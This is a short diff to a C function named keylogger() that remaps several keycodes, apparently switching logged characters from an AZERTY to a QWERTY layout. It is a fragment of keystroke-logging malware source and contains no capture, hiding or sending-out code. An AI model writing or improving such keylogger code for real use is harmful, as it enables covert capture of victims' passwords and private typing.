@@ -94,7 +94,7 @@ void keylogger()
 					write(log, "q", 1);
 					break;	
 				case 17:
-					write(log, "z", 1);
+					write(log, "w", 1);
 					break;
 				case 18:
 					write(log, "e", 1);
@@ -154,7 +154,7 @@ void keylogger()
 					write(log, "l", 1);
 					break;
 				case 39:
-					write(log, "m", 1);
+					write(log, ",", 1);
 					break;
 				case 40:
 					write(log, "%", 1);
@@ -169,7 +169,7 @@ void keylogger()
 					write(log, "`", 1);
 					break;
 				case 44:
-					write(log, "w", 1);
+					write(log, "z", 1);
 					break;
 				case 45:
 					write(log, "x", 1);
@@ -187,7 +187,7 @@ void keylogger()
 					write(log, "n", 1);
 					break;
 				case 50:
-					write(log, ",", 1);
+					write(log, "m", 1);
 					break;
 				case 51:
 					write(log, ";", 1);
